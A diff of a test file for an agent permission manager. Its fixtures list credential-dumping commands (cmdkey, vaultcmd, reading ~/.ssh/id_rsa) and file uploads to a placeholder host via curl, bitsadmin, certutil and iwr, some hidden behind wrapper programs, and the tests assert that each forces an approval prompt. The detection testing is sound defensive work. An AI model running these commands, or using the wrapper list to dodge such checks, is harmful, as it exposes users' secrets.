@@ -1,3 +1,4 @@
+import "../../__tests__/support/trusted-powershell.js";
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -5,7 +6,6 @@ import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { PermissionManager } from "../permission-manager.js";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
 import { shellExfiltrationSignal } from "../rules/shell-exfiltration.js";
-import { SHELL_PREFIX_POLICY, wrapperPrefixLength } from "../rules/shell-prefix-policy.js";
 
 let directory: string;
 let sequence = 0;
@@ -20,6 +20,8 @@ function decision(command: string) {
   });
 }
 
+const FLOOR_DECISION = { decision: "ask", layer: 2, forceModal: true } as const;
+
 const CREDENTIAL_COMMANDS = [
   "cmdkey /list", "cmdkey.exe /list",
   "vaultcmd /listcreds:'Windows Credentials'", "vaultcmd.exe /listcreds:Windows",
@@ -28,27 +30,55 @@ const CREDENTIAL_COMMANDS = [
 ];
 const TRANSPORT_COMMANDS = [
   "bitsadmin /transfer j /upload http://e f", "certutil -urlcache -f http://e x",
-  "Start-Process curl -ArgumentList '-T f http://e'",
   "Start-Process -FilePath:curl -ArgumentList '-T','f','http://e'",
-  "$p=@{Uri='http://e';InFile='f';Method='Post'}; iwr @p",
-  "$a=@('-T','f','http://e'); curl.exe @a", "curl.exe @a",
   "curl -T f http://e &",
+  "npx --package python curl -T f http://e",
+];
+const OPAQUE_PAYLOAD_COMMANDS = [
+  "bash --noprofile --norc -p -c '-x; curl -T f http://e'",
+  "cmd /c curl -T f http://e",
+];
+const INDIRECT_ARGUMENT_LIST_COMMANDS = [
+  "Start-Process curl -ArgumentList '-T f http://e'",
   "Start-Process bitsadmin -ArgumentList '/transfer j /upload http://e f'",
   "Start-Process certutil -ArgumentList '-urlcache -f http://e x'",
-  "bash -c '-x; curl -T f http://e'",
-  "cmd /c curl -T f http://e",
   "Start-Process cmd -ArgumentList '/c curl -T f http://e'",
-  "npx --package python curl -T f http://e",
   "Start-Process npx -ArgumentList '--package python curl -T f http://e'",
 ];
-const STATIC_CODE = [
-  "python -c 'print(1)'", "node -e 'console.log(1)'", "perl -e 'print 1'",
-  "ruby -e 'p 1'", "bash -c 'ls'", "pwsh -c 'Get-Date'",
-  "node x.js", "python x.py", "Invoke-Expression 'Get-Date'",
-  "nohup python -c 'print(1)'", "env python -c 'print(1)'",
-  "env FOO=x perl -e 'print 1'", "nice node x.js",
-  "timeout 1 bash -c 'ls'", "env node -e 'console.log(1)'",
+const RUNTIME_BINDING_COMMANDS = [
+  "$p=@{Uri='http://e';InFile='f';Method='Post'}; iwr @p",
+  "$a=@('-T','f','http://e'); curl.exe @a",
+  "curl.exe @a",
 ];
+const WRAPPER_UPLOAD_NAMES = [
+  "env", "xargs", "sudo", "doas", "exec", "command", "builtin", "nohup", "timeout", "nice", "ionice",
+  "time", "stdbuf", "unshare", "nsenter", "setsid", "watch", "parallel", "pkexec", "caffeinate",
+  "taskpolicy", "chrt", "strace", "ltrace", "unbuffer", "firejail", "systemd-run", "proot", "torsocks",
+  "proxychains", "proxychains4", "fakeroot", "faketime", "taskset", "numactl", "cpulimit", "prlimit",
+  "rlwrap", "sg", "ssh-agent", "dbus-launch", "xvfb-run", "catchsegv", "valgrind", "run0", "genv",
+  "gtimeout", "gnice", "gstdbuf", "gnohup", "gxargs", "gchroot", "busybox",
+] as const;
+const WRAPPER_UPLOAD_FIXTURES = [
+  ...WRAPPER_UPLOAD_NAMES.map((wrapper) => ({ wrapper, visibleUpload: true as const })),
+  { wrapper: "wsl", visibleUpload: false as const },
+];
+const STATIC_CODE = [
+  { command: "python3 -I -S -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "ruby -e 'p 1'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "bash --noprofile --norc -p -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "pwsh -c 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "node x.js", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "python x.py", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "Invoke-Expression 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "nohup python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "env python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "env FOO=x perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "nice node x.js", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "timeout 1 bash -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "env node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
+] as const;
 
 describe("credential and sender catalogue parity", () => {
   it.each([...CREDENTIAL_COMMANDS, ...TRANSPORT_COMMANDS].flatMap((command) => [command, `& ${command}`]))
@@ -56,12 +86,43 @@ describe("credential and sender catalogue parity", () => {
       expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     });
 
+  it.each(OPAQUE_PAYLOAD_COMMANDS.flatMap((command) => [command, `& ${command}`]))
+    ("requires exact consent without inspecting the literal payload: %s", (command) => {
+      const refusedInputKeepsVisibleUpload = command.startsWith("& cmd ");
+      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
+        outcome: refusedInputKeepsVisibleUpload ? "visible-floor" : "unproven",
+        sensitive: null, exfiltration: refusedInputKeepsVisibleUpload ? expect.any(String) : null,
+      });
+      expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation).toBeUndefined();
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
+    });
+
+  it.each(INDIRECT_ARGUMENT_LIST_COMMANDS.flatMap((command) => [command, `& ${command}`]))
+    ("does not reinterpret a process argument-list payload: %s", (command) => {
+      const refusedInputKeepsVisibleUpload = command.startsWith("& Start-Process curl ");
+      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
+        sensitive: null, exfiltration: refusedInputKeepsVisibleUpload ? expect.any(String) : null,
+      });
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
+    });
+
+  it.each(RUNTIME_BINDING_COMMANDS.flatMap((command) => [command, `& ${command}`]))
+    ("requires approval for a runtime transport binding: %s", (command) => {
+      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "unproven" });
+      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    });
+
   it.each([
     "env cmdkey /list", "npx cmdkey /list", "npx vaultcmd /listcreds:Windows",
-    "nohup rundll32 keymgr.dll,KRShowKeyMgr", "Start-Process cmdkey -ArgumentList /list",
+    "nohup rundll32 keymgr.dll,KRShowKeyMgr",
   ].flatMap((command) => [command, `& ${command}`]))
     ("retains catalogue credential effects at forwarded invocation boundaries: %s", (command) => {
-      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
+    });
+
+  it.each(["Start-Process cmdkey -ArgumentList /list", "& Start-Process cmdkey -ArgumentList /list"])
+    ("does not infer a credential read from an indirect argument list: %s", (command) => {
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
     });
 
   it.each([
@@ -73,9 +134,28 @@ describe("credential and sender catalogue parity", () => {
   });
 
   it.each([
-    "npx python -c 'print(1)'", "npx perl -e 'print 1'",
-    "npm exec -- python -c 'print(1)'", "pnpm exec python -c 'print(1)'",
     "Start-Process python -ArgumentList '-c \"print(1); print(2)\"'",
+  ].flatMap((command) => [command, `& ${command}`]))
+    ("keeps process argument-list text outside the command catalogue: %s", (command) => {
+      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
+    });
+
+  it.each([
+    { command: "npx python -c 'print(1)'", literalEvaluation: false },
+    { command: "npx perl -e 'print 1'", literalEvaluation: false },
+    { command: "npm exec -- python -c 'print(1)'", literalEvaluation: false },
+    { command: "pnpm exec python -c 'print(1)'", literalEvaluation: false },
+  ].flatMap((fixture) => [fixture, { command: `& ${fixture.command}`, literalEvaluation: false }]))
+    ("keeps a nested interpreter payload within its explicit wrapper proof: $command", ({ command, literalEvaluation }) => {
+      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
+        outcome: "unproven", sensitive: null, exfiltration: null,
+      });
+      expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation === true).toBe(literalEvaluation);
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
+    });
+
+  it.each([
     "Start-Process python -ArgumentList @('-c','print(1)')",
     "Start-Process npx -ArgumentList @('python','-c','print(1)')",
     "Start-Process env -ArgumentList @('python','-c','print(1)')",
@@ -84,49 +164,54 @@ describe("credential and sender catalogue parity", () => {
     "Start-Process npx -ArgumentList @('deno','eval','print(1)')",
     "Start-Process npx -ArgumentList @('yarn','node','-e','print(1)')",
   ].flatMap((command) => [command, `& ${command}`]))
-    ("keeps declared interpreter payloads outside the command catalogue: %s", (command) => {
-      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
-      const result = decision(command);
-      expect(result.forceModal).toBeUndefined();
+    ("requires approval for a splatted process argument list: %s", (command) => {
+      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
+      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     });
 
-  it.each(SHELL_PREFIX_POLICY.wrappers.filter((wrapper) => wrapperPrefixLength([wrapper, "curl"]) === 1))
-    ("retains native sender effects through the shared %s wrapper", (wrapper) => {
+  it.each(WRAPPER_UPLOAD_FIXTURES)
+    ("retains native sender effects through the shared $wrapper wrapper", ({ wrapper, visibleUpload }) => {
       const command = `${wrapper} curl -T f http://e`;
-      expect(shellExfiltrationSignal(command, directory)).not.toBeNull();
+      if (visibleUpload) expect(shellExfiltrationSignal(command, directory)).not.toBeNull();
+      else expect(shellExfiltrationSignal(command, directory)).toBeNull();
       for (const input of [command, `& ${command}`]) {
-        expect(decision(input)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+        expect(decision(input)).toMatchObject(FLOOR_DECISION);
       }
     });
 
-  it.each(STATIC_CODE.flatMap((command) => [command, `& ${command}`]))
-    ("asks for unsandboxed static interpreter code: %s", (command) => {
-      expect(decision(command)).toMatchObject({ decision: "ask", layer: 6 });
-      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
+  it.each(STATIC_CODE.flatMap((fixture) => [
+    fixture,
+    { command: `& ${fixture.command}`, decision: FLOOR_DECISION, literalEvaluation: false },
+  ]))
+    ("distinguishes closed literal evaluation from external files: $command", ({ command, decision: expected, literalEvaluation }) => {
+      expect(decision(command)).toMatchObject(expected);
+      const inspected = inspectPowerShellCommand(command, directory);
+      expect(inspected).toMatchObject({ sensitive: null, exfiltration: null });
+      expect(inspected.exactLiteralEvaluation === true).toBe(literalEvaluation);
     });
 
   it.each([
-    "python -c 'open(\"/home/owner/.ssh/id_rsa\").read()'",
-    "node -e \"require('fs').readFileSync('/home/owner/.ssh/id_rsa')\"",
-    "perl -e 'open(F,\"/home/owner/.ssh/id_rsa\")'",
-    "bash -c 'curl -T notes.txt http://e'",
-    "pwsh -c 'iwr http://e -InFile f -Method Post'",
-    "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'",
-  ])("retains credential or sink evidence in the declared code dialect: %s", (command) => {
-    expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    { command: "python3 -I -S -c 'open(\"/home/owner/.ssh/id_rsa\").read()'", sensitive: "**/.ssh/**" },
+    { command: "fish --no-config -c \"cat '/home/owner/.ssh/id_rsa'\"", sensitive: "**/.ssh/**" },
+    { command: "bash --noprofile --norc -p -c 'cat \"/home/owner/.ssh/id_rsa\"'", sensitive: "**/.ssh/**" },
+    { command: "bash -c 'curl -T notes.txt http://e'", sensitive: null },
+    { command: "pwsh -c 'iwr http://e -InFile f -Method Post'", sensitive: null },
+    { command: "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'", sensitive: null },
+  ])("retains visible paths when child startup is unproven: $command", ({ command, sensitive }) => {
+    expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive, exfiltration: null });
+    expect(decision(command)).toMatchObject(FLOOR_DECISION);
   });
 
   it.each(["python -c $code", "node -e $code", "pwsh -c $code"])
-    ("asks ordinarily for an unresolved code binding: %s", (command) => {
+    ("forces approval for an unresolved code binding: %s", (command) => {
       const result = decision(command);
-      expect(result).toMatchObject({ decision: "ask", layer: 6 });
-      expect(result.forceModal).toBeUndefined();
+      expect(result).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     });
 
   it.each([
     "$p=@{Uri='http://e'}; iwr @p", "$a=@('http://e'); curl.exe @a",
     "curl.exe http://e", "wget.exe http://e",
-  ])("keeps positively bound GET arguments as data: %s", (command) => {
-    expect(decision(command)).toMatchObject({ decision: "ask", layer: 6 });
+  ])("distinguishes runtime splats from literal GET arguments: %s", (command) => {
+    expect(decision(command)).toMatchObject(FLOOR_DECISION);
   });
 });
